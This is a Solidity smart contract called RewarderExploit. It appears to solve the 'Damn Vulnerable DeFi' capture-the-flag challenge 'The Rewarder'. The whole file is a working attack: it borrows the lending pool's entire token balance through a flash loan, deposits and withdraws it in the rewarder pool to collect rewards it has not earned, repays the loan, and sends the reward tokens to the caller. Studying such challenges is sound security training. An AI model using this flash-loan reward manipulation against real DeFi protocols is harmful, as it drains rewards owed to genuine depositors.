//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";

/**
 * @title RewarderExploit
 * @notice Claims reward from `TheRewarderPool` contract using flashloan to manipulate reward calculation
 * @author Joshua Oladeji <analogdev.eth>
 */
contract RewarderExploit {
    IFlashLoanerPool public lendingPool;
    IRewarderPool public rewarderPool;
    IERC20 public dvtToken;
    IERC20 public rewardToken;

    constructor(
        IFlashLoanerPool _lendingPool,
        IRewarderPool _rewarderPool,
        IERC20 _dvtToken,
        IERC20 _rewardToken
    ) {
        lendingPool = _lendingPool;
        rewarderPool = _rewarderPool;
        dvtToken = _dvtToken;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 _amount) external {
        dvtToken.approve(address(rewarderPool), _amount);

        // deposit tokens into reward pool for instant rewards
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);

        // repay flashloan
        dvtToken.transfer(msg.sender, _amount);
    }

    function attack() external {
        // request flashloan
        lendingPool.flashLoan(
            lendingPool.liquidityToken().balanceOf(address(lendingPool))
        );
		// transfer rewards to function caller
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;

    function liquidityToken() external view returns (DamnValuableToken);
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}
